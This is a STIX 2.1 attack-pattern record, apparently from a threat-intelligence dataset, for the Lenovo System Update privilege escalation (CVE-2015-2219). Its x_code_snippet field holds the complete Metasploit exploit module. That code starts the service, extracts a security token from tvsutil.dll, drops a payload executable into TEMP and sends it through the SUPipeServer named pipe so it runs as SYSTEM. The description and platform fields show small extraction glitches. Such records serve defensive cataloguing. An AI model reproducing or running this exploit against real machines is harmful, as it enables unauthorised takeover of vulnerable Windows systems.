{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a67a6d91-3d6c-42d2-ab0b-2f35a6b712a9",
    "created": "2024-08-14T16:49:23.076553Z",
    "modified": "2024-08-14T16:49:23.076557Z",
    "name": "Lenovo System Update Privilege Escalation",
    "description": " The named pipe, \\SUPipeServer, can be accessed by normal users to interact with the System update service. The service provides the possibility to execute arbitrary commands as SYSTEM if a valid security token is provided. This token can be generated by calling the GetSystemInfoData function in the DLL tvsutil.dll. Please, note that the System Update is stopped by default but can be started/stopped calling the Executable ConfigService.exe.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/lenovo_systemupdate.rb",
            "external_id": "lenovo_systemupdate.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-2219"
        },
        {
            "source_name": "reference",
            "url": "http://www.ioactive.com/pdfs/Lenovo_System_Update_Multiple_Privilege_Escalations.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  include Msf::Exploit::EXE\n  include Msf::Post::File\n  include Msf::Exploit::FileDropper\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Services\n\n  Rank = ExcellentRanking\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => 'Lenovo System Update Privilege Escalation',\n          'Description' => %q{\n            The named pipe, \\SUPipeServer, can be accessed by normal users to interact with the\n            System update service. The service provides the possibility to execute arbitrary\n            commands as SYSTEM if a valid security token is provided. This token can be generated\n            by calling the GetSystemInfoData function in the DLL tvsutil.dll. Please, note that the\n            System Update is stopped by default but can be started/stopped calling the Executable\n            ConfigService.exe.\n          },\n          'License' => MSF_LICENSE,\n          'Author' => [\n            'Michael Milvich', # vulnerability discovery, advisory\n            'Sofiane Talmat',  # vulnerability discovery, advisory\n            'h0ng10'           # Metasploit module\n          ],\n          'Arch' => ARCH_X86,\n          'Platform' => 'win',\n          'SessionTypes' => ['meterpreter'],\n          'DefaultOptions' => {\n            'EXITFUNC' => 'thread'\n          },\n          'Targets' => [\n            [ 'Windows', {} ]\n          ],\n          'Payload' => {\n            'Space' => 2048,\n            'DisableNops' => true\n          },\n          'References' => [\n            ['OSVDB', '121522'],\n            ['CVE', '2015-2219'],\n            ['URL', 'http://www.ioactive.com/pdfs/Lenovo_System_Update_Multiple_Privilege_Escalations.pdf']\n          ],\n          'DisclosureDate' => '2015-04-12',\n          'DefaultTarget' => 0,\n          'Compat' => {\n            'Meterpreter' => {\n              'Commands' => %w[\n                stdapi_railgun_api\n              ]\n            }\n          }\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('WritableDir', [false, 'A directory where we can write files (%TEMP% by default)']),\n      OptInt.new('Sleep', [true, 'Time to sleep while service starts (seconds)', 4]),\n    ])\n  end\n\n  def check\n    unless session.platform == 'windows'\n      return Exploit::CheckCode::Safe\n    end\n\n    svc = service_info('SUService')\n    if svc && svc[:display] =~ /System Update/\n      vprint_good(\"Found service '#{svc[:display]}'\")\n      return Exploit::CheckCode::Detected\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def write_named_pipe(pipe, command)\n    invalid_handle_value = 0xFFFFFFFF\n\n    r = session.railgun.kernel32.CreateFileA(pipe, 'GENERIC_READ | GENERIC_WRITE', 0x3, nil, 'OPEN_EXISTING', 'FILE_FLAG_WRITE_THROUGH | FILE_ATTRIBUTE_NORMAL', 0)\n    handle = r['return']\n\n    if handle == invalid_handle_value\n      fail_with(Failure::NoTarget, \"#{pipe} named pipe not found\")\n    else\n      vprint_good(\"Opended #{pipe}! Proceeding...\")\n    end\n\n    begin\n      # First, write the string length as Int32 value\n      w = client.railgun.kernel32.WriteFile(handle, [command.length].pack('l'), 4, 4, nil)\n\n      if w['return'] == false\n        print_error('The was an error writing to pipe, check permissions')\n        return false\n      end\n\n      # Then we send the real command\n      w = client.railgun.kernel32.WriteFile(handle, command, command.length, 4, nil)\n\n      if w['return'] == false\n        print_error('The was an error writing to pipe, check permissions')\n        return false\n      end\n    ensure\n      session.railgun.kernel32.CloseHandle(handle)\n    end\n    true\n  end\n\n  def get_security_token(lenovo_directory)\n    unless client.railgun.get_dll('tvsutil')\n      client.railgun.add_dll('tvsutil', \"#{lenovo_directory}\\\\tvsutil.dll\")\n      client.railgun.add_function('tvsutil', 'GetSystemInfoData', 'DWORD', [['PWCHAR', 'systeminfo', 'out']], nil, 'cdecl')\n    end\n\n    dll_response = client.railgun.tvsutil.GetSystemInfoData(256)\n\n    dll_response['systeminfo'][0, 40]\n  end\n\n  def config_service(lenovo_directory, option)\n    cmd_exec(\"#{lenovo_directory}\\\\ConfigService.exe #{option}\")\n  end\n\n  def exploit\n    if is_system?\n      fail_with(Failure::NoTarget, 'Session is already elevated')\n    end\n\n    su_directory = service_info('SUService')[:path][1..-16]\n    print_status('Starting service via ConfigService.exe')\n    config_service(su_directory, 'start')\n\n    print_status('Giving the service some time to start...')\n    Rex.sleep(datastore['Sleep'])\n\n    print_status('Getting security token...')\n    token = get_security_token(su_directory)\n    vprint_good(\"Security token is: #{token}\")\n\n    if datastore['WritableDir'].nil? || datastore['WritableDir'].empty?\n      temp_dir = get_env('TEMP')\n    else\n      temp_dir = datastore['WritableDir']\n    end\n\n    print_status(\"Using #{temp_dir} to drop the payload\")\n\n    begin\n      cd(temp_dir)\n    rescue Rex::Post::Meterpreter::RequestError\n      fail_with(Failure::BadConfig, \"Failed to use the #{temp_dir} directory\")\n    end\n\n    print_status('Writing malicious exe to remote filesystem')\n    write_path = pwd\n    exe_name = \"#{rand_text_alpha(rand(10..19))}.exe\"\n\n    begin\n      write_file(exe_name, generate_payload_exe)\n      register_file_for_cleanup(\"#{write_path}\\\\#{exe_name}\")\n    rescue Rex::Post::Meterpreter::RequestError\n      fail_with(Failure::Unknown, \"Failed to drop payload into #{temp_dir}\")\n    end\n\n    print_status('Sending Execute command to update service')\n\n    begin\n      write_res = write_named_pipe('\\\\\\\\.\\\\pipe\\\\SUPipeServer', \"/execute #{exe_name} /arguments /directory #{write_path} /type COMMAND /securitycode #{token}\")\n    rescue Rex::Post::Meterpreter::RequestError\n      fail_with(Failure::Unknown, 'Failed to write to pipe')\n    end\n\n    unless write_res\n      fail_with(Failure::Unknown, 'Failed to write to pipe')\n    end\n\n    print_status('Stopping service via ConfigService.exe')\n    config_service(su_directory, 'stop')\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-04-12",
    "x_mitre_platforms": [
        "win'"
    ]
}